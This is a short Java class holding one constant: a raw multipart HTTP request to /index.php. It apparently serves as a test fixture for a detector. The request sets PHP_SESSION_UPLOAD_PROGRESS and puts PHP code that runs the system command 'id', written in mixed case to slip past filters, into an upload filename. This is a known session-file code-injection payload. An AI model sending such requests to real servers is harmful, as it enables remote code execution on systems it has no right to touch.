final class Request {
  static final String REQUEST = "POST /index.php HTTP/1.1\nContent-Type: Multipart/Form-Data; boundary=--upload-check\n\n----upload-check\nContent-Disposition: form-data; name=\"PHPSESSID\"\n\nvariant-session\n----upload-check\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\n\nx\n----upload-check\nContent-Disposition: form-data; name=\"f\"; filename=\"<?PHP SyStEm('id');?>\"\nContent-Type: text/plain\n\nZ\n----upload-check--\n";
}
